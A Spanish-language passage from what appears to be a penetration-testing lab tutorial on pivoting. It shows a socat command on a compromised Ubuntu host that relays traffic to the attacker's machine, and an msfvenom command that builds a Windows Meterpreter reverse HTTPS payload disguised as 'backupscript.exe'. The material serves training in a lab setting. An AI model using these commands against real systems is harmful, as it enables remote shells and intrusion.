**Socat** es una herramienta de red bidireccional que permite crear sockets tipo canal entre dos conexiones de red independientes sin necesidad de utilizar túneles SSH. Actúa como un redireccionador que puede escuchar en un host y puerto determinados y reenviar ese tráfico a otra dirección IP y puerto. Podemos iniciar el listener de Metasploit en nuestro equipo atacante utilizando el mismo comando mencionado en la sección anterior, y ejecutar `socat` en el servidor Ubuntu.

##### Comenzando el listener de Socat

```shell-session
ubuntu@Webserver:~$ socat TCP4-LISTEN:8080,fork TCP4:10.10.14.18:80
```

**Socat** escuchará en `localhost` en el puerto 8080 y reenviará todo el tráfico al puerto 80 de nuestro equipo atacante (`10.10.14.18`). Una vez que nuestro redireccionador esté configurado, podremos generar un payload que se conecte de vuelta a dicho redireccionador, que estará ejecutándose en el servidor Ubuntu. También iniciaremos un listener en nuestro equipo atacante, ya que, en cuanto `socat` reciba una conexión desde un objetivo, redirigirá todo el tráfico hacia el listener en el equipo atacante, donde recibiremos una shell.

##### Generando el payload Windows

```shell-session
amr251@htb[/htb]$ msfvenom -p windows/x64/meterpreter/reverse_https LHOST=172.16.5.129 -f exe -o backupscript.exe LPORT=8080
```

> *Hay que tener en cuenta que debemos transferir el payload al host Windows, podemos usar técnicas vistas previamente*


